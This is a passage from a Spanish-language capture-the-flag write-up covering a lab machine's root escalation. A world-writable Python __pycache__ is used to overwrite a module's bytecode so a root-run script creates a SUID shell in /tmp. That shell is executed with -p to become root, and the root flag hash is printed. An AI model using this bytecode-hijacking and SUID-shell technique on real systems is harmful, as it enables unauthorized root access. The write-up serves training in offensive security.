    echo "[+] Archivos /tmp/*root*:"
    find /tmp -name "*root*" -type f -newer /tmp/extension_utils_exact.py 2>/dev/null | xargs ls -la 2>/dev/null || echo "  No encontrados"
fi
```

Resultado:

```
[+] Ejecutando script como root...
[+] ¡¡ÉXITO!! Shell SUID creada en /tmp/compact_root
[-] Skipping version bumping
[-] Skipping packaging
```

Veremos que el archivo malicioso se ha creado correctamente.

### Mecanismo del Ataque

1. **World-writable `__pycache__`**: Los permisos excesivos permiten escribir archivos `.pyc` arbitrarios
2. **Python cache validation**: Python confía en `.pyc` si coinciden tamaño y timestamp
3. **Module hijacking**: Se sobrescribe el bytecode legítimo con código malicioso
4. **Privilege execution**: El script se ejecuta como root, otorgando privilegios elevados al payload

Comprobamos la existencia del binario SUID:

```shell
ls -la /tmp/compact_root
```

Resultado:

```
-rwsr-xr-x  1 root     root     1446024 Jan 13 10:30 compact_root
```

Como se observa, el binario ha sido creado correctamente. Ahora lo ejecutamos con el parámetro `-p` para mantener los privilegios efectivos:

```shell
/tmp/compact_root -p
```

Resultado:

```
compact_root-5.2# whoami
root
```

Con esto ya somos el usuario `root`, por lo que podemos leer la `flag` correspondiente.

> root.txt

```
ef02b0d525ca2358c594daefe86f14a4
```
